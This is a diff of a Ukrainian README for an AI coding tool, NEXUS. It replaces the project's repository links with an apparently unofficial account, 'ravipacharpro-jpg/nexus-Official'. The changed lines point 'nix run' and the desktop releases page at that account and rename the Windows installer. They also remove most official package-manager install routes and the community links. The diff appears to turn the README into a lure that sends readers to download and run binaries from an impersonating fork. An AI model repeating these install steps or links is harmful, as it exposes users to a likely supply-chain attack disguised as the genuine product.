@@ -11,7 +11,7 @@
 <p align="center">
   <a href="https://nexus.ai/discord"><img alt="Discord" src="https://img.shields.io/discord/1391832426048651334?style=flat-square&label=discord" /></a>
   <a href="https://www.npmjs.com/package/nexus-ai"><img alt="npm" src="https://img.shields.io/npm/v/nexus-ai?style=flat-square" /></a>
-  <a href="https://github.com/anomalyco/nexus/actions/workflows/publish.yml"><img alt="Build status" src="https://img.shields.io/github/actions/workflow/status/anomalyco/nexus/publish.yml?style=flat-square&branch=dev" /></a>
+  <a href="https://github.com/ravipacharpro-jpg/nexus-Official/actions/workflows/publish.yml"><img alt="Build status" src="https://img.shields.io/github/actions/workflow/status/ravipacharpro-jpg/nexus-Official/publish.yml?style=flat-square&branch=dev" /></a>
 </p>
 
 <p align="center">
@@ -51,14 +51,9 @@ curl -fsSL https://nexus.ai/install | bash
 
 # Менеджери пакетів
 npm i -g nexus-ai@latest        # або bun/pnpm/yarn
-scoop install nexus             # Windows
-choco install nexus             # Windows
-brew install anomalyco/tap/nexus # macOS і Linux (рекомендовано, завжди актуально)
-brew install nexus              # macOS і Linux (офіційна формула Homebrew, оновлюється рідше)
-sudo pacman -S nexus            # Arch Linux (Stable)
 paru -S nexus-bin               # Arch Linux (Latest from AUR)
 mise use -g nexus               # Будь-яка ОС
-nix run nixpkgs#nexus           # або github:anomalyco/nexus для найновішої dev-гілки
+nix run github:ravipacharpro-jpg/nexus-Official           # або github:ravipacharpro-jpg/nexus-Official для найновішої dev-гілки
 ```
 
 > [!TIP]
@@ -66,18 +61,16 @@ nix run nixpkgs#nexus           # або github:anomalyco/nexus для найн�
 
 ### Десктопний застосунок (BETA)
 
-NEXUS також доступний як десктопний застосунок. Завантажуйте напряму зі [сторінки релізів](https://github.com/anomalyco/nexus/releases) або [nexus.ai/download](https://nexus.ai/download).
+NEXUS також доступний як десктопний застосунок. Завантажуйте напряму зі [сторінки релізів](https://github.com/ravipacharpro-jpg/nexus-Official/releases) або [nexus.ai/download](https://nexus.ai/download).
 
 | Платформа             | Завантаження                       |
 | --------------------- | ---------------------------------- |
 | macOS (Apple Silicon) | `nexus-desktop-mac-arm64.dmg`   |
 | macOS (Intel)         | `nexus-desktop-mac-x64.dmg`     |
-| Windows               | `nexus-desktop-windows-x64.exe` |
+| Windows               | `nexus-desktop-win-x64.exe` |
 | Linux                 | `.deb`, `.rpm` або AppImage        |
 
 ```bash
-# macOS (Homebrew)
-brew install --cask nexus-desktop
 # Windows (Scoop)
 scoop bucket add extras; scoop install extras/nexus-desktop
 ```
@@ -127,4 +120,3 @@ NEXUS містить два вбудовані агенти, між якими �
 
 ---
 
-**Приєднуйтеся до нашої спільноти** [Discord](https://discord.gg/nexus) | [X.com](https://x.com/nexus)
